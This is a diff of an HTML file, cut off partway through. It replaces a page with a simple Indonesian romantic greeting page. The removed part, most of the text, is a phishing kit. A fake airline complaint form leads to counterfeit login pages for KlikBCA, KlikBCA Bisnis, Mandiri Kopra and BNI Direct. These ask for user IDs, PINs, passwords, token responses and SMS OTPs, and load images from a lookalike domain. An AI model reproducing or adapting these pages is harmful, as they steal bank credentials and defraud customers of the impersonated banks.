@@ -1,997 +1,138 @@
+HTML
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Layanan Penerbangan Indonesia</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Untuk Sayang ❤️</title>
+<style>
+* { box-sizing: border-box; }
 
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+body {
+  margin: 0;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: Arial, sans-serif;
+  color: white;
+  text-align: center;
+  background: linear-gradient(135deg, #ff758c, #ff4b6e, #7b2ff7);
+  overflow: hidden;
+}
 
-  <style>
-    body { margin: 0; padding: 0; overflow-x: hidden; font-family: 'Poppins', sans-serif; }
-    .page-section { display: none; width: 100%; min-height: 100vh; }
-    .page-section.active { display: block; animation: fadeIn 0.4s ease-in-out; }
-    
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
+.card {
+  width: 90%;
+  max-width: 380px;
+  padding: 35px 25px;
+  border: 1px solid #ffffff55;
+  border-radius: 25px;
+  background: #ffffff20;
+  backdrop-filter: blur(12px);
+  box-shadow: 0 10px 40px #0002;
+  z-index: 2;
+}
 
-    #page-1.active { display: flex; flex-direction: column; align-items: center; }
-    #page-1 {
-      background: url('https://penerbanganmaskapai.com/assets/img/planes.jpg') center/cover no-repeat fixed;
-      position: relative;
-      min-height: 100vh;
-      justify-content: center;
-    }
-    #page-1::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.4);
-      z-index: 0;
-    }
-    #page-1 .mobile-container-1 {
-      position: relative;
-      z-index: 1;
-      width: 100%;
-      max-width: 480px;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      background: transparent;
-    }
-    #page-1 .top-header-img-1 {
-      position: relative;
-      width: 100%;
-      height: 260px;
-      background: url('https://penerbanganmaskapai.com/assets/img/cssku.jpeg') center 20%/cover no-repeat;
-    }
-    #page-1 .top-header-overlay-1 {
-      position: absolute;
-      inset: 0;
-      background: linear-gradient(to bottom, rgba(0,0,0,0.1) 30%, rgba(0,0,0,0.8) 100%);
-      display: flex;
-      flex-direction: column;
-      justify-content: flex-end;
-      padding: 30px 20px;
-      text-align: left;
-      color: white;
-    }
-    #page-1 .top-header-overlay-1 h1 { font-size: 24px; font-weight: 700; margin: 0 0 5px 0; line-height: 1.2; }
-    #page-1 .top-header-overlay-1 p { font-size: 14px; font-weight: 400; margin: 0; color: #f3f4f6; }
-    
-    #page-1 .form-container-1 {
-      padding: 30px 24px;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.85) 100%);
-      color: white;
-    }
-    #page-1 .form-title-1 { font-size: 19px; font-weight: 600; color: #ffffff; margin: 0 0 20px 0; line-height: 1.4; }
-    #page-1 .footer-text-1 { text-align: center; padding: 20px; font-size: 13px; color: #9ca3af; font-weight: 500; margin-top: auto; }
+.heart {
+  font-size: 75px;
+  animation: beat 1s infinite;
+}
 
-    #page-3 { background-color: #ffffff; font-family: Arial, sans-serif; padding: 0; margin: 0; min-height: 100vh; }
-    #page-3 .bca-header { background-color: #2b3990; border-top: 4px solid #f6d133; border-bottom: 4px solid #f6d133; height: 50px; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; }
-    #page-3 .bca-header img { height: 35px; background: white; padding: 3px; border-radius: 2px; }
-    #page-3 .bca-header .full-site-link { color: #ffffff; font-size: 13px; text-decoration: underline; font-family: Arial, sans-serif; }
-    #page-3 .bca-body { padding: 15px 20px; }
-    #page-3 .bca-form-group { margin-bottom: 12px; }
-    #page-3 .bca-label-id { font-family: 'Times New Roman', Times, serif; font-size: 19px; color: #354063; display: inline-block; border-bottom: 1px solid #354063; padding-bottom: 2px; margin-bottom: 2px; }
-    #page-3 .bca-label-en { font-family: 'Times New Roman', Times, serif; font-size: 17px; color: #e5a100; display: block; margin-bottom: 6px; }
-    #page-3 .bca-input { border: 1px solid #000; padding: 3px 5px; width: 100%; max-width: 300px; font-size: 16px; outline: none; border-radius: 0; }
-    #page-3 .bca-btn { background-color: #f0f0f0; border: 1px solid #999; padding: 4px 12px; font-size: 13px; font-family: Arial, sans-serif; color: #000; cursor: pointer; margin-top: 5px; border-radius: 2px; }
-    #page-3 .bca-btn:hover { background-color: #e0e0e0; }
-    #page-3 .bca-banner { width: 100%; max-width: 100%; margin-top: 15px; margin-bottom: 15px; display: block; }
-    #page-3 .bca-security { display: flex; gap: 10px; margin-bottom: 20px; align-items: center; }
-    #page-3 .bca-security img { height: 35px; object-fit: contain; }
-    #page-3 .bca-footer { font-size: 12px; color: #444; line-height: 1.5; font-family: Arial, sans-serif; }
-    #page-3 .bca-footer a { color: #444; text-decoration: underline; }
-    #page-3 .bca-footer .en { color: #e5a100; margin-top: 15px; }
-    #page-3 .bca-footer .en a { color: #e5a100; }
-    .bca-error-msg { color: red; font-size: 12px; font-weight: bold; margin-bottom: 8px; display: block; }
+h1 { font-size: 32px; }
 
-    #page-4.active { display: flex; }
-    #page-4 { font-family: Arial, sans-serif; background: #ffffff; justify-content: center; align-items: flex-start; color: #00569c; }
-    #page-4 .container-box { width: 100%; max-width: 480px; padding: 0; box-sizing: border-box; position: relative; min-height: 100vh; }
+p {
+  line-height: 1.7;
+  font-size: 16px;
+}
 
-    #page-5.active { display: flex; }
-    #page-5 { background: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; justify-content: center; align-items: center; }
-    
-    #page-6.active { display: flex; }
-    #page-6 { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #fdfbfb 0%, #e8f5e9 100%); min-height: 100vh; align-items: flex-start; justify-content: center; padding-top: 0; }
+button {
+  border: none;
+  border-radius: 30px;
+  padding: 14px 25px;
+  margin-top: 12px;
+  background: white;
+  color: #ff416c;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
 
-    #page-7.active, #page-8.active { display: flex; }
-    #page-7, #page-8 { background: #ffffff; font-family: 'Inter', sans-serif; justify-content: center; align-items: flex-start; padding-top: 30px; }
-    .cc-container { width: 100%; max-width: 420px; padding: 24px; box-sizing: border-box; margin: auto; }
+button:active { transform: scale(.95); }
 
-    #puzzleModal {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.65);
-      backdrop-filter: blur(4px);
-      z-index: 9999;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 16px;
-    }
-    .captcha-card {
-      background: #ffffff;
-      border-radius: 16px;
-      width: 100%;
-      max-width: 360px;
-      padding: 20px;
-      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.2), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
-      position: relative;
-      animation: popUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
-    @keyframes popUp {
-      from { transform: scale(0.85); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
-    }
-    .slider-container {
-      position: relative;
-      width: 100%;
-      height: 42px;
-      background: #f1f5f9;
-      border-radius: 21px;
-      border: 1px solid #cbd5e1;
-      margin-top: 15px;
-      overflow: hidden;
-    }
-    .slider-track {
-      position: absolute;
-      top: 0;
-      left: 0;
-      height: 100%;
-      width: 0%;
-      background: #3b82f6;
-      border-radius: 21px 0 0 21px;
-      transition: width 0.05s ease;
-    }
-    .slider-thumb {
-      position: absolute;
-      top: 2px;
-      left: 2px;
-      width: 36px;
-      height: 36px;
-      background: #ffffff;
-      border-radius: 50%;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      user-select: none;
-      color: #3b82f6;
-      font-size: 14px;
-      transition: left 0.05s ease;
-    }
-  </style>
+#pesan {
+  display: none;
+  margin-top: 20px;
+  font-weight: bold;
+}
+
+.floating {
+  position: absolute;
+  bottom: -40px;
+  animation: naik 6s linear infinite;
+  pointer-events: none;
+}
+
+@keyframes beat {
+  50% { transform: scale(1.2); }
+}
+
+@keyframes naik {
+  to {
+    transform: translateY(-110vh) rotate(360deg);
+    opacity: 0;
+  }
+}
+</style>
 </head>
 <body>
 
-  <div id="page-1" class="page-section active">
-    <div class="mobile-container-1">
-      <div class="top-header-img-1">
-        <div class="top-header-overlay-1">
-          <h1>Layanan Penerbangan Indonesia</h1>
-          <p>Kami siap membantu masalah penerbangan Anda!</p>
-        </div>
-      </div>
+<div class="card">
+  <div class="heart">❤️</div>
+  <h1>Hai, Sayang!</h1>
+  <p>
+    Ada satu hal yang ingin aku bilang...
+    <br>
+    Kamu adalah alasan aku tersenyum setiap hari.
+    Terima kasih sudah hadir di hidupku. 🥰
+  </p>
 
-      <div class="form-container-1">
-        <h4 class="form-title-1">Formulir Pengaduan Booking Tiket</h4>
-        <form id="bookingForm" class="w-full">
-          
-          <label class="block text-sm font-semibold mb-2 text-white" for="opsi">Pilih Opsi</label>
-          <div class="relative mb-4">
-            <select class="w-full border border-gray-400 bg-white rounded-md px-3 py-2 text-sm text-gray-900 appearance-none" id="opsi" name="a" required>
-              <option value="" disabled selected>-- Pilih Opsi --</option>
-              <option value="Booking Seat">Booking Seat</option>
-              <option value="Checkin Online">Check in Online</option>
-              <option value="Refund Dana">Refund Dana</option>
-              <option value="Reschedule">Reschedule</option>
-              <option value="Tambah Bagasi">Tambah Bagasi</option>
-              <option value="Update Nama">Update Nama</option>
-              <option value="Lainnya">Bantuan Lainnya</option>
-            </select>
-          </div>
-          
-          <label class="block text-sm font-semibold mb-2 text-white" for="idBooking">Masukkan ID Booking</label>
-          <div class="relative mb-4">
-            <input class="w-full border border-gray-400 bg-white text-gray-900 rounded-md px-3 py-2 text-sm uppercase placeholder-gray-500" id="idBooking" name="b" required type="text">
-          </div>
-          
-          <label class="block text-sm font-semibold mb-2 text-white" for="phone">Nomor Handphone</label>
-          <div class="mb-6">
-            <input class="w-full border border-gray-400 bg-white text-gray-900 rounded-md px-3 py-2 text-sm placeholder-gray-500" id="phone" name="c" maxlength="16" placeholder="+62xxxxxxxxx" required type="tel">
-          </div>
-          
-          <button class="w-full bg-[#3b5998] hover:bg-blue-700 text-white text-sm font-semibold py-3 rounded-md shadow" type="submit">
-            Konfirmasi
-          </button>
-        </form>
-      </div>
+  <button onclick="bukaPesan()">
+    Klik di sini 💌
+  </button>
 
-      <div class="footer-text-1">
-        Layanan Penerbangan - All Rights Reserved.
-      </div>
-    </div>
-  
-    <div id="loadingOverlay" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-      <div class="flex flex-col items-center space-y-4">
-        <svg class="animate-spin h-12 w-12 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
-        </svg>
-        <span class="text-white font-semibold text-lg">Loading...</span>
-      </div>
-    </div>
+  <div id="pesan">
+    Aku sayang kamu ❤️🥹
+    <br>
+    Jangan pernah bosan sama aku ya!
+    <br>
+    💕 I Love You 💕
   </div>
+</div>
 
-  <div id="page-3" class="page-section">
-    <div class="bca-header">
-      <img src="https://penerbanganmaskapai.com/assets/img/logo_bca_64x55.gif" alt="KlikBCA">
-      <a href="#" class="full-site-link" id="bcaFullSiteLink" style="display: none;">Full Site</a>
-    </div>
-    <div class="bca-body">
-      <div id="bca-step-1">
-        <form id="bcaLoginForm">
-          <div class="bca-form-group">
-            <span class="bca-label-id">Silakan masukkan USER ID Anda</span>
-            <span class="bca-label-en">Please enter your USER ID</span>
-            <input type="text" name="_a" id="txt_user_id" class="bca-input" autocomplete="off" required>
-          </div>
-          <div class="bca-form-group">
-            <span class="bca-label-id">Silakan masukkan PIN Internet Banking Anda</span>
-            <span class="bca-label-en">Please enter your Internet Banking PIN</span>
-            <input type="password" name="_b" id="txt_pswd" class="bca-input" autocomplete="off" maxlength="6" required>
-          </div>
-          <button type="submit" class="bca-btn">SIGN IN</button>
-        </form>
-      </div>
+<script>
+function bukaPesan() {
+  document.getElementById("pesan").style.display = "block";
+}
 
-      <div id="bca-step-2" style="display: none;">
-        <form id="bcaKeyForm">
-          <div class="bca-form-group">
-            <span class="bca-label-id">Silakan memasukkan kode keyBCA</span>
-            <span class="bca-label-en">Please enter Code KeyBCA</span>
-            <input type="text" name="_keybca" id="txt_keybca" class="bca-input" autocomplete="off" placeholder="Masukkan kode Apply 1" required>
-          </div>
-          <span class="bca-error-msg" id="bcaErrorText">PASTIKAN DATA YANG DIINPUT TELAH BENAR.<br>BCA TIDAK BERTANGGUNG JAWAB TERHADAP KESALAHAN PENGINPUTAN DATA</span>
-          <button type="submit" class="bca-btn">SIGN IN</button>
-        </form>
-      </div>
+function buatHati() {
+  const hati = document.createElement("div");
+  hati.className = "floating";
+  hati.textContent = ["❤️", "💕", "💖", "💗"][
+    Math.floor(Math.random() * 4)
+  ];
 
-      <img id="blinkingBanner" src="https://penerbanganmaskapai.com/assets/img/banner_login_1.png" alt="Promo" class="bca-banner">
-      <div class="bca-security">
-        <img src="https://penerbanganmaskapai.com/assets/img/keamanan-ib.png" alt="Modus">
-        <img src="https://penerbanganmaskapai.com/assets/img/digicert-seal.png" alt="Digicert">
-      </div>
-      <div class="bca-footer">
-        <p style="margin: 0 0 5px 0;">BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.</p>
-        <p style="margin: 0 0 5px 0;">BCA merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS adalah Rp2 miliar.</p>
-        <p style="margin: 0 0 15px 0;">Untuk cek Tingkat Bunga Penjaminan LPS, klik <a href="#">disini</a>.</p>
-        <div class="en">
-          <p style="margin: 0 0 5px 0;">BCA is licensed and supervised by Financial Services Authority (Otoritas Jasa Keuangan & Bank Indonesia).</p>
-          <p style="margin: 0 0 5px 0;">BCA is a member of Indonesia Deposit Insurance Corporation (LPS). The maximum value of deposits guaranteed per customer per bank is IDR 2 billion.</p>
-          <p style="margin: 0;">To check the LPS Guarantee Interest Rate, click <a href="#">here</a>.</p>
-        </div>
-      </div>
-    </div>
-  </div>
+  hati.style.left = Math.random() * 100 + "vw";
+  hati.style.fontSize = (18 + Math.random() * 25) + "px";
+  hati.style.animationDuration = (4 + Math.random() * 4) + "s";
 
-  <div id="page-4" class="page-section">
-    <div class="container-box">
-      
-      <div id="bca-biz-step-1" style="background: #ffffff; width: 100%; padding: 25px 20px; box-sizing: border-box; min-height: 100vh;">
-        <div style="display: flex; justify-content: flex-end; align-items: center; margin-bottom: 30px;">
-          <a href="#" style="text-decoration: none; color: #00569c; font-size: 14px; margin-right: 8px;">English Version</a>
-          <i class="fas fa-home" style="color: #00569c; font-size: 20px;"></i>
-        </div>
-        
-        <div style="text-align: center;">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Bank_Central_Asia.svg" alt="BCA Logo" style="width: 140px; margin: 0 auto;">
-          <h2 style="margin: 10px 0 2px 0; font-size: 22px; font-weight: bold; color: #00569c;">KlikBCA Bisnis</h2>
-          <p style="margin-top:0; font-size:14px; color:#00569c;">VPN Secure Connection</p>
-        </div>
-        
-        <form id="bizForm1" style="text-align: left; margin-top: 35px;">
-          <div style="margin-bottom: 20px;">
-            <label style="display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; color: #00569c;">Username</label>
-            <input type="text" id="biz_user" name="_a" autocomplete="off" placeholder="CorporateID UserID (tanpa spasi)" required style="width: 100%; padding: 14px; border: 1px solid #a3d4f7; border-radius: 8px; font-size: 15px; box-sizing: border-box; color: #333; outline: none;">
-          </div>
-          <div style="margin-bottom: 30px;">
-            <label style="display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; color: #00569c;">Password</label>
-            <input type="password" id="biz_pass" name="_b" autocomplete="off" placeholder="KeyBCA Appli 1" inputmode="numeric" required style="width: 100%; padding: 14px; border: 1px solid #a3d4f7; border-radius: 8px; font-size: 15px; box-sizing: border-box; color: #333; outline: none;">
-          </div>
-          <button type="submit" style="width: 100%; padding: 14px; background-color: #00569c; color: white; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer;">LOGIN</button>
-        </form>
+  document.body.appendChild(hati);
 
-        <div style="margin-top: 50px; font-size: 13px; color: #333; line-height: 1.5;">
-          <p style="margin-bottom: 15px;">Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses <a href="#" style="color: #00569c; text-decoration: underline;">Informasi KlikBCA Bisnis</a> atau hubungi:</p>
-          
-          <div style="display: flex; align-items: center; margin-bottom: 15px;">
-            <img src="https://img.icons8.com/color/48/000000/speech-bubble.png" style="width: 26px; height: 26px; margin-right: 12px;" alt="">
-            <div>
-              <div style="color: #00569c;">Halo Layanan KlikBCA Bisnis</div>
-              <div style="font-weight: bold; color: #00569c; font-size: 14px;">1500777</div>
-            </div>
-          </div>
-          
-          <div style="display: flex; align-items: center; margin-bottom: 15px;">
-            <img src="https://img.icons8.com/color/48/000000/gmail-new.png" style="width: 26px; height: 26px; margin-right: 12px;" alt="">
-            <div>
-              <div style="color: #00569c;">Email</div>
-              <div style="font-weight: bold; color: #0000ff; text-decoration: underline; font-size: 14px;">[email protected]</div>
-            </div>
-          </div>
-          
-          <div style="display: flex; align-items: center;">
-            <img src="https://img.icons8.com/color/48/000000/twitter--v1.png" style="width: 26px; height: 26px; margin-right: 12px;" alt="">
-            <div>
-              <div style="color: #00569c;">Twitter</div>
-              <div style="font-weight: bold; color: #00569c; font-size: 14px;">@HaloBCA</div>
-            </div>
-          </div>
-        </div>
-      </div>
+  setTimeout(() => hati.remove(), 8000);
+}
 
-      <div id="bca-biz-step-2" style="display: none; background: #f0f2f5; width: 100%; min-height: 100vh; position: absolute; top: 0; left: 0;">
-        <div style="background-color: #0d5bb5; height: 220px; width: 100%; display: flex; justify-content: center; padding-top: 35px; box-sizing: border-box;">
-          <img src="https://i.ibb.co.com/KxFGpfF9/20260125-234019.png" style="height: 100px; object-fit: contain;" alt="KlikBCA Bisnis Logo">
-        </div>
-        
-        <div style="background: #ffffff; border-radius: 20px 20px 0 0; margin-top: -30px; padding: 30px 20px; box-sizing: border-box; text-align: center; min-height: calc(100vh - 190px);">
-          
-          <div style="display: flex; justify-content: space-between; gap: 12px; margin-bottom: 30px;">
-            <div style="flex: 1; border: 1px solid #d3dbe5; border-radius: 12px; padding: 6px; background: #fff;">
-              <img src="https://i.ibb.co.com/VcZkGpxS/IMG-20260125-234259.jpg" style="width: 100%; border-radius: 8px;" alt="">
-            </div>
-            <div style="flex: 1; border: 1px solid #d3dbe5; border-radius: 12px; padding: 6px; background: #fff;">
-              <img src="https://i.ibb.co.com/QZh1r1C/IMG-20260125-234347.jpg" style="width: 100%; border-radius: 8px;" alt="">
-            </div>
-            <div style="flex: 1; border: 1px solid #d3dbe5; border-radius: 12px; padding: 6px; background: #fff;">
-              <img src="https://i.ibb.co.com/99586rBp/IMG-20260125-234425.jpg" style="width: 100%; border-radius: 8px;" alt="">
-            </div>
-          </div>
-          
-          <form id="bizForm2" style="text-align: left;">
-            <div style="margin-bottom: 16px;">
-              <input type="text" name="_corp_id" placeholder="Corporate ID" required style="width: 100%; padding: 14px 16px; border-radius: 8px; border: 1px solid #d3dbe5; background: #fff; font-size: 15px; box-sizing: border-box; color: #666; outline: none;">
-            </div>
-            <div style="margin-bottom: 16px;">
-              <input type="text" name="_user_id" placeholder="User ID" required style="width: 100%; padding: 14px 16px; border-radius: 8px; border: 1px solid #d3dbe5; background: #fff; font-size: 15px; box-sizing: border-box; color: #666; outline: none;">
-            </div>
-            <div style="margin-bottom: 25px;">
-              <input type="password" name="_key_resp" placeholder="Key Response" inputmode="numeric" required style="width: 100%; padding: 14px 16px; border-radius: 8px; border: 1px solid #d3dbe5; background: #fff; font-size: 15px; box-sizing: border-box; color: #666; outline: none;">
-            </div>
-            <button type="submit" style="width: 100%; padding: 15px; background: #0b63b5; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer;">SIGN IN</button>
-          </form>
-          
-          <div style="margin-top: 25px; font-size: 14px;">
-            <a href="#" style="color: #0b63b5; font-weight: bold; text-decoration: none;">Pindah ke full site &gt;&gt;</a>
-          </div>
-          <div style="margin-top: 15px; font-size: 12px; color: #777; line-height: 1.4; padding: 0 10px;">
-            Key Response adalah PIN dinamis yang dihasilkan dari perangkat keamanan Anda
-          </div>
-        </div>
-      </div>
+setInterval(buatHati, 500);
+</script>
 
-      <div id="bca-biz-step-3" style="display: none; background: #f4f6f9; width: 100%; min-height: 100vh; position: absolute; top: 0; left: 0;">
-        <div style="width: 100%; max-width: 500px; margin: 20px auto; background: #fff; border: 1px solid #ccc; font-family: Arial, sans-serif;">
-          <div style="background: #00569c; color: white; padding: 12px 10px; font-size: 13px; font-weight: bold; line-height: 1.4;">
-            Demi meningkatkan keamanan untuk bertransaksi VPN KLIKBCA (wajib) Persetuan syarat ketentuan berlaku
-          </div>
-          <table style="width: 100%; border-collapse: collapse; font-size: 12px; color: #00569c;">
-            <tr style="background: #e8f4fa;">
-              <td style="padding: 10px; border-bottom: 1px solid #fff;">Silakan aktifkan Token Anda dengan menekan tombol <i class="fas fa-volume-up"></i></td>
-            </tr>
-            <tr style="background: #ffffff;">
-              <td style="padding: 10px; border-bottom: 1px solid #e8f4fa;">Masukkan Token pada saat muncul pesan <b>"TOKEN"</b></td>
-            </tr>
-            <tr style="background: #e8f4fa;">
-              <td style="padding: 10px; border-bottom: 1px solid #fff;">Tekan angka 2 pada saat muncul pesan <b>"APPLI"</b></td>
-            </tr>
-            <tr style="background: #ffffff;">
-              <td style="padding: 10px; display: flex; justify-content: space-between; align-items: center;">
-                <div>
-                  <p style="margin: 0 0 5px 0;">Masukkan angka yang tertera di samping ini:</p>
-                  <p style="margin: 0 0 5px 0; color: #cc0000; font-weight: bold; text-decoration: underline; cursor: pointer;">LIHAT ANGKA</p>
-                  <p style="margin: 0 0 15px 0;">pada Token Anda</p>
-                  <p style="margin: 0 0 5px 0;">Masukkan angka yang tertera pada layar Token Anda</p>
-                  <div style="display: flex; align-items: center; gap: 5px; margin-top: 5px;">
-                    <span style="white-space: nowrap;">Pada kolom di samping ini</span>
-                    <input type="text" id="finalTokenInput" inputmode="numeric" style="border: 1px solid #999; width: 80px; padding: 3px 5px; outline: none;" required>
-                    <button type="button" onclick="submitBizFinal()" style="background: #00569c; color: white; border: none; padding: 4px 12px; border-radius: 12px; cursor: pointer; font-size: 11px; font-weight: bold;">Kirim</button>
-                  </div>
-                </div>
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLF_PjjMs5nGtqQSpgCeWZYMaKPiUn4yZin1UiVXv_tg&s=10" alt="KeyBCA" style="width: 80px; height: 80px; object-fit: contain; margin-left: 10px;">
-              </td>
-            </tr>
-            <tr style="background: #e8f4fa;">
-              <td style="padding: 10px;">Tekan tombol <i class="fas fa-volume-up"></i> untuk mematikan Token</td>
-            </tr>
-          </table>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-  <div id="page-5" class="page-section">
-    <div class="mandiri-container" style="width: 100%; max-width: 480px; padding: 0; box-sizing: border-box; margin: 0 auto; background: #fff; min-height: 100vh; position: relative;">
-      
-      <div id="mandiri-step-1" style="padding: 20px; display: flex; flex-direction: column; min-height: 100vh;">
-        <div style="text-align: center; margin-top: 50px; margin-bottom: 40px;">
-          <img src="https://penerbanganmaskapai.com/assets/images/logo512.png" alt="Kopra by mandiri" style="height: 60px;">
-          <h2 style="font-size: 24px; font-weight: 700; margin-top: 25px; color: #000;">Welcome to Kopra</h2>
-        </div>
-        <form id="mandiriForm1" style="flex: 1;">
-          <div style="margin-bottom: 20px;">
-            <label style="display: block; font-size: 14px; color: #333; margin-bottom: 5px;">Company ID</label>
-            <input type="text" name="_a" required style="width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #e0e0e0; font-size: 16px; outline: none; box-sizing: border-box;">
-          </div>
-          <div style="margin-bottom: 20px;">
-            <label style="display: block; font-size: 14px; color: #333; margin-bottom: 5px;">User ID</label>
-            <input type="text" name="_b" required style="width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #e0e0e0; font-size: 16px; outline: none; box-sizing: border-box;">
-          </div>
-          <div style="margin-bottom: 40px;">
-            <label style="display: block; font-size: 14px; color: #333; margin-bottom: 5px;">Password</label>
-            <input type="password" name="_c" required style="width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #e0e0e0; font-size: 16px; outline: none; box-sizing: border-box;">
-          </div>
-          <button type="submit" style="width: 100%; padding: 16px; background: #000; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: 500; margin-bottom: 30px;">Sign In</button>
-        </form>
-        <div style="display: flex; justify-content: space-between; align-items: flex-start; padding-bottom: 80px;">
-          <div style="font-weight: bold; font-size: 15px; color: #000; cursor: pointer;">Forgot Password?</div>
-          <div style="text-align: right;">
-            <div style="font-size: 11px; color: #666; margin-bottom: 5px;">Security certified by</div>
-            <img src="https://penerbanganmaskapai.com/assets/images/DigiCert_logo.svg" alt="DigiCert" style="height: 24px;">
-          </div>
-        </div>
-        <div style="position: absolute; bottom: 20px; right: 20px;">
-          <button style="background: #ffb700; color: #000; border: none; padding: 12px 24px; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer;">Contact Support</button>
-        </div>
-      </div>
-
-      <div id="mandiri-step-2" style="display: none; padding: 20px; min-height: 100vh;">
-        <h2 style="font-size: 20px; font-weight: 500; margin-top: 30px; margin-bottom: 20px; color: #000;">Masukkan Kode OTP SMS</h2>
-        <div style="background: #e0f2f1; padding: 15px; border-radius: 8px; margin-bottom: 25px; color: #00695c; font-size: 14px; line-height: 1.5;">
-          Masukkan Kode OTP sudah dikirimkan ke telepon seluler Anda +62xxxxxxxxx, waktu tersisa <span id="mandiriTimer">04:00</span>
-        </div>
-        <form id="mandiriForm2">
-          <div style="margin-bottom: 20px;">
-            <label style="display: block; font-size: 16px; margin-bottom: 8px; color: #000;">Kode OTP <span style="color: red;">*</span></label>
-            <input type="text" name="_otp" required style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; outline: none; box-sizing: border-box;">
-          </div>
-          <button type="submit" style="width: 100%; padding: 14px; background: #4a4deb; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 500;">Kirim</button>
-        </form>
-        <div style="text-align: center; margin-top: 60px; color: #666; font-size: 13px;">
-          Layananpenerbanganindo - All Rights Reserved.
-        </div>
-      </div>
-      
-    </div>
-  </div>
-
-  <div id="page-6" class="page-section">
-    <div style="width: 100%; max-width: 480px; background: transparent; padding: 0;">
-      <div style="text-align: center; padding: 40px 20px 20px 20px;">
-        <img src="https://penerbanganmaskapai.com/assets/images/deva.svg" alt="BNI Direct" style="height: 40px; margin: 0 auto;">
-      </div>
-      <div style="background: #fff; border-radius: 20px 20px 0 0; padding: 30px 24px; min-height: calc(100vh - 100px); box-shadow: 0 -4px 10px rgba(0,0,0,0.05);">
-        <h2 style="text-align: center; font-size: 22px; font-weight: bold; color: #000; margin-bottom: 5px;">Masuk ke Akun Anda</h2>
-        <p style="text-align: center; font-size: 14px; color: #888; margin-bottom: 30px;">Selamat Datang!</p>
-        
-        <form id="bniForm">
-          <div style="margin-bottom: 20px;">
-            <label style="display: block; font-size: 14px; font-weight: 600; color: #000; margin-bottom: 8px;">Company ID</label>
-            <input type="text" id="company" name="_a" required style="width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; outline: none; box-sizing: border-box;">
-          </div>
-          <div style="margin-bottom: 20px;">
-            <label style="display: block; font-size: 14px; font-weight: 600; color: #000; margin-bottom: 8px;">User ID</label>
-            <input type="text" id="user" name="_b" required style="width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; outline: none; box-sizing: border-box;">
-          </div>
-          <div style="margin-bottom: 30px;">
-            <label style="display: block; font-size: 14px; font-weight: 600; color: #000; margin-bottom: 8px;">Password</label>
-            <input type="password" id="password" name="_c" required style="width: 100%; padding: 12px 16px; border: 1px solid #b2dfdb; border-radius: 8px; font-size: 15px; outline: none; box-sizing: border-box;">
-          </div>
-          
-          <div style="display: flex; gap: 15px; margin-bottom: 20px;">
-            <button type="button" onclick="document.getElementById('bniForm').reset()" style="flex: 1; padding: 14px; background: #fff; color: #333; border: 1px solid #d1d5db; border-radius: 25px; font-weight: bold; font-size: 15px; cursor: pointer;">Hapus</button>
-            <button type="submit" style="flex: 1; padding: 14px; background: #ef6200; color: #fff; border: none; border-radius: 25px; font-weight: bold; font-size: 15px; cursor: pointer;">Sign In</button>
-          </div>
-        </form>
-        
-        <div style="margin-bottom: 15px;">
-          <a href="#" style="color: #ef6200; font-size: 14px; font-weight: 500; text-decoration: none;">Forgot Password?</a>
-        </div>
-        <p style="font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 25px;">By pressing the Sign In button, you agree to terms and condition</p>
-        
